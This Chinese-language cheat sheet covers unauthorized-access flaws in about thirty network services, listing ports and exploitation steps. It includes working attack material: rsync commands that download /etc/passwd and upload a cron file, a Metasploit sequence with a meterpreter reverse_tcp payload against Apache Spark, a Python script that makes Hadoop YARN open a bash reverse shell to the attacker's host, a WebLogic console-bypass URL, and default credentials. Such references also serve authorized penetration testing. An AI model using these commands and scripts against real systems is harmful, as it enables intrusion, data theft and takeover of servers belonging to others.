## 简介

未授权访问，在不进行请求授权的情况下对需要权限的功能进行访问执行。通常是由于认证存在缺陷、无认证或安全配置不当导致。常见于服务端口，接口未限制开放，网页功能通过链接无限制用户访问，低权限用户越权访问高权限功能。

## FTP 未授权访问

- 端口：21
- 介绍：FTP服务端配置anymouns 可登录，则可直接使用user为anymouns，不输入密码直接可登录到FTP
- 漏洞利用：直接访问ftp路径：ftp://ip:port/，或终端登录，输入user为anymouns

##  LDAP 未授权访问

- 端口：389
- 介绍：LDAP 底层一般使用 TCP 或 UDP 作为传输协议。目录服务是一个特殊的数据库，是一种以树状结构的目录数据库为基础。未对LDAP的访问进行密码验证，导致未授权访问
- 漏洞利用：[工具](https://ldapbrowserwindows.com/)连接

## rsync 未授权访问

- 端口：873
- 介绍：rsync是Linux下一款数据备份工具，支持通过rsync协议、ssh协议进行远程文件传输。其中rsync协议默认监听873端口，如果目标开启了rsync服务，并且没有配置ACL或访问密码，我们将可以读写目标服务器文件
- 漏洞利用：https://vulhub.org/#/environments/rsync/common/
  - `rsync rsync://your-ip:873/src/ ` 列出目录
  - `rsync -av rsync://your-ip:873/src/etc/passwd ./`  下载文件
  - `rsync -av shell rsync://your-ip:873/src/etc/cron.d/shell` 上传文件

##  ZooKeeper 未授权访问

- 端口：2181
- 介绍：ZooKeeper 是一个分布式的开放源码的分布式应用程序协调服务，ZooKeeper 默认开启在 2181 端口在未进行任何访问控制的情况下攻击者可通过执行 envi 命令获得系统大量的敏感信息包括系统名称Java 环境，任意用户在网络可达的情况下进行为未授权访问并读取数据甚至 kill 服务。
- 漏洞利用：
  - `echo envi| nc xxx.xxx.xxx.xxx 2181` 获取服务器环境信息
  - `echo stat | nc 192.168.131.128 2181`

## Docker 未授权访问

- 端口：2375
- 介绍：Docker API可以执行Docker命令，在未授权的情况下可以执行docker命令
- 漏洞利用：https://vulhub.org/#/environments/docker/unauthorized-rce/

## Docker Registry 未授权访问

- 端口：5000
- 介绍：docker remote api可以执行docker命令
- 漏洞利用：
  - `curl -k -XGET https://xxx.xxx.xxxx/v2/_catalog` 查询catalog
  - `curl -k -XGET https://xxx.xxx.xxx/v2/<image>/tags/list `查询tags

## Kibana 未授权访问

- 端口: 5001
- 介绍：Kibana如果允许外网访问，没有做安全的登录认证，也会被外部随意访问查看所有的数据，造成数据泄露。
- 漏洞利用：
  - 直接访问kibana的页面


## VNC未授权访问

- 端口：5900, 5901
- 介绍：VNC 是虚拟网络控制台Virtual Network Console的英文缩写。它是一款优秀的远程控制工具软件由美国电话电报公司AT&T的欧洲研究实验室开发。VNC是基于 UNXI 和 Linux 的免费开源软件由 VNC Server 和 VNC Viewer 两部分组成。VNC 未授权访问漏洞如被利用可能造成恶意用户直接控制受控主机危害相当严重
- 漏洞利用：下载[VNC® Viewer](https://www.realvnc.com/en/connect/download/viewer/)，并连接

## CouchDB 未授权访问

- 端口：5984
- 介绍：Apache CouchDB 是一个开源数据库，默认会在5984端口开放Restful的API接口，如果使用SSL的话就会监听在6984端口，用于数据库的管理功能。其HTTP Server默认开启时没有进行验证，而且绑定在0.0.0.0，所有用户均可通过API访问导致未授权访问。
- 漏洞利用：`curl xxx.xxx.xxx.xxx:5984/_config`

## Apache Spark 未授权访问

- 端口：6066, 8081,8082
- 介绍：Apache Spark是一款集群计算系统，其支持用户向管理节点提交应用，并分发给集群执行。如果管理节点未启动访问控制，攻击者可以在集群中执行任意代码。该漏洞的本质是未授权用户可以向Master节点提交一个应用，Master节点会分发给Slave节点执行应用。如果应用中包含恶意代码，会导致任意代码执行，威胁Spark集群整体的安全性。
- 漏洞利用：使用msf工具getshell

```shell
msf5>use exploit/linux/http/spark_unauth_rce
msf5>set payload java/meterpreter/reverse_tcp
msf5>set rhost xxx.xxxx.xxxx
msf5>set rport 6066
msf5>set lhost xxx.xxx.xxx.xxx
msf5>set lport 4444
msf5>set srvhost xxx.xxx.xxx.xxx
msf5>set srvport 8080
msf5>exploit
```

## Redis 未授权访问

- 端口：6379

- 介绍：redis是一个数据库，默认端口是6379，redis默认是没有密码验证的，可以免密码登录操作，攻击者可以通过操作redis进一步控制服务器。

  Redis未授权访问在4.x/5.0.5以前版本下，可以使用master/slave模式加载远程模块，通过动态链接库的方式执行任意命令

- 漏洞利用：redis-cli远程连接

## Weblogic 未授权访问

- 端口：7001

- 介绍：Weblogic是Oracle公司推出的J2EE应用服务器，CVE-2020-14882允许未授权的用户绕过管理控制台的权限验证访问后台。

  CVE-2020-14883允许后台任意用户通过HTTP协议执行任意命令。使用这两个漏洞组成的利用链，可通过一个GET请求在远程Weblogic服务器上以未授权的任意用户身份执行命令。

- 漏洞利用：

  - `http://xxx.xxx.xxx.xxx:7001/console/css/%252e%252e%252fconsole.portal`进入后台

## Hadoop YARN 未授权访问

- 端口：8088
- 介绍：Hadoop是一款由Apache基金会推出的分布式系统框架，它通过著名的MapReduce算法进行分布式处理，Yarn是Hadoop集群的资源管理系统。此次事件主要因HadoopYARN资源管理系统配置不当，导致可以未经授权进行访问，从而被攻击者恶意利用。攻击者无需认证即可通过RESTAPI部署任务来执行任意指令，最终完全控制服务器。
- 漏洞利用

```python
#!/usr/bin/env python
import requests
target = 'http://xxx.xxx.xxx.xxx:8088/' # 设置目标主机的ip地址
lhost = 'xxx.xxx.xxx.xxx' # 设置你攻击主机的监听ip地址，并且监听端口为9999
url = target + 'ws/v1/cluster/apps/new-application'
resp = requests.post(url)
app_id = resp.json()['application-id']
url = target + 'ws/v1/cluster/apps'
data = {
    'application-id': app_id,
    'application-name': 'get-shell',
    'am-container-spec': {
        'commands': {
            'command': '/bin/bash -i >& /dev/tcp/%s/9999 0>&1' % lhost,
        },
    },
    'application-type': 'YARN',
}
requests.post(url, json=data)
```

## JBoss 未授权访问

- 端口：8080
- 介绍：JBOSS 企业应用平台EAP是 J2EE 应用的中间件平台。默认情况下访问 http://ip:8080/jmx-console，就可以浏览 Jboss 的部署管理的信息不需要输入用户名和密码可以直接部署上传木马有安全隐患。
- 漏洞利用：
  - 同tomcat manager

## Jenkins 未授权访问

- 端口：8080
- 介绍：默认情况下Jenkins面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者可通过未授权访问漏洞或者暴力破解用户密码等进脚本执行界面从而获取服务器权限。
- 漏洞利用：未授权访问 `http://<target>:8080/script`，可以执行系统命令

##  Kubernetes Api Server 未授权

- 端口：8080,10250
- 介绍：Kubernetes 的服务在正常启动后会开启两个端口：Localhost Port （默认8080）、Secure Port （默认6443）。这两个端口都是提供 Api Server 服务的，一个可以直接通过 Web 访问，另一个可以通过 kubectl 客户端进行调用。如果运维人员没有合理的配置验证和权限，那么攻击者就可以通过这两个接口去获取容器的权限。
- 漏洞利用：
  - ` http://xxx.xxx.xxx.xxx:8080/` 可以看到路由信息
  - 10250端口是kubelet API的HTTPS端口，通过路径:`https://xxx.xxx.xxx.xxx/10250/pods`获取环境变量、运行的容器信息、命名空间等信息

## Active MQ 未授权访问

- 端口：8161
- 介绍：ActiveMQ 是一款流行的开源消息服务器。默认情况下，ActiveMQ 服务是没有配置安全参数。恶意人员可以利用默认配置弱点发动远程命令执行攻击，获取服务器权限，从而导致数据泄露。
- 漏洞利用：
  - 默认口令：admin/admin

## Jupyter Notebook 未授权访问

- 端口：8888
- 介绍：Jupyter Notebook（此前被称为 IPython notebook）是一个交互式笔记本，支持运行 40 多种编程语言。如果管理员未为Jupyter Notebook配置密码，将导致未授权访问漏洞，游客可在其中创建一个console并执行任意Python代码和命令。
- 漏洞利用：
  - 访问`http://xxx.xxx.xxx.xxx:8888`，将看到Jupyter Notebook的Web管理界面，并没有要求填写密码
  - 选择 new -> terminal 即可创建一个控制台
  - 直接执行任意命令

## Elasticsearch 未授权访问

- 端口：9200,9300
- 介绍：Elasticsearch是一款java编写的企业级搜索服务。越来越多的公司使用ELK作为日志分析，启动此服务默认会开放9200端口或者9300端口，可被非法操作数据。
- 漏洞利用：
  - 直接访问`http://xxx.xxx.xxx.xxx:9200`
  - `_cat/indices` 
  - `_river/_search ` 数据库信息
  - `_nodes ` 节点信息
  - `_plugin/head` （有head插件的情况下）

## Zabbix 未授权访问

- 端口：10051
- 介绍：zabbix是一款服务器监控软件，默认服务开放端口为10051，其由server、agent、web等模块组成，其中web模块由PHP编写，用来显示数据库中的结果。
- 漏洞利用
  - 无需账户密码直接访问zabbix页面

##  RabbitMQ 未授权访问

- 端口：15672,15692,25672
- 介绍：RabbitMQ是目前非常热门的一款消息中间件，基于AMQP协议的，可以在发布者和使用者之间交换异步消息。消息可以是人类可读的JSON，简单字符串或可以转换为JSON字符串的值列表。
- 漏洞利用：
  - 默认账号密码都是guest

## MongoDB 未授权访问

- 端口：27017
- 介绍：开启MongoDB服务时不添加任何参数时,默认是没有权限验证的,登录的用户可以通过默认端口无需密码对数据库任意操作（增、删、改、查高危动作）而且可以远程访问数据库。
- 漏洞利用：
  - 使用数据库连接工具 如navicat 等直接连接

##  NFS 未授权访问

- 端口：2049，20048
- 介绍：NetworkFileSystem(NFS)，是由SUN公司研制的UNIX表示层协议(pressentation layer protocol)，能使使用者访问网络上别处的文件就像在使用自己的计算机一样。服务器在启用nfs服务以后，由于nfs服务未限制对外访问，导致共享目录泄漏
- 漏洞利用：
  - 安装nfs客户端 `nfs-common`
  - 查看nfs服务器上的共享目录 `showmount -e xxx.xxx.xxx.xxx`
  - 挂载相应共享目录到本地 `mount -t nfs xxx.xxx.xxx.xxx:/grdata /mnt`

## Dubbo 未授权访问

- 端口：28096
- 介绍：Dubbo是阿里巴巴公司开源的一个高性能优秀的 服务框架，使得应用可通过高性能的 RPC 实现服务的输 出和输入功能，可以和 Spring框架无缝集成。dubbo 因配置不当导致未授权访问漏洞
- 漏洞利用：`telnet ip port`

## Druid 未授权访问

- 端口：/
- 介绍：Druid是阿里巴巴数据库出品的，为监控而生的数据库连接池，并且Druid提供的监控功能，监控SQL的执行时间、监控Web URI的请求、Session监控，首先Druid是不存在什么漏洞的。但当开发者配置不当时就可能造成未授权访问
- 漏洞利用：
  - /druid/index.html
  - /druid/websession.html
  - /druid/datasource.html
  - /druid/sql.html
  - /druid/spring.html

## Solr 未授权访问

- 端口：443,8443
- 介绍：Solr是一个高性能，采用Java开发，基于Lucene的全文搜索服务器。solr的管理界面通常包含如下信息：solr的配置信息（包括路径，用户名，系统版本信息），数据库的配置信息（地址，用户名，密码），数据库搜索数据等。solr未授权访问的危害很大，轻则可查询所有数据库信息，重则可读取系统任意文件，甚至getshell
- 漏洞利用
  - /solr/admin

## SpringBoot Actuator 未授权访问

- 端口：/
- 介绍：Actuator 是 springboot 提供的用来对应用系统进行自省和监控的功能模块，借助于 Actuator 开发者可以很方便地对应用系统某些监控指标进行查看、统计等。在 Actuator 启用的情况下，如果没有做好相关权限控制，非法用户可通过访问默认的执行器端点（endpoints）来获取应用系统中的监控信息，从而导致信息泄露甚至服务器被接管的事件发生。
- 漏洞利用：
  - /actuator/autoconfig
  - /actuator/env
  - /actuator/dump
  - /actuator/headdump 可下载

##  SwaggerUI未授权访问漏洞

- 端口：/
- 介绍：Swagger 是一个规范且完整的框架，用于生成、描述、调用和可视化 RESTful 风格的 Web 服务。
- 漏洞利用：
  - swagger-ui未直接部在IP根目录下
  - 直接访问

## Harbor未授权添加管理员漏洞

- 端口：/
- 介绍：Harbor未授权添加任意管理员漏洞。攻击者可通过构造特定的字符串，在未授权的情况下直接创建管理员账号，从而接管Harbor镜像仓库
- 漏洞利用：
  - /harbor/sign-in
  - 注册管理员

## 参考链接

https://blog.csdn.net/weixin_57567655/article/details/126493671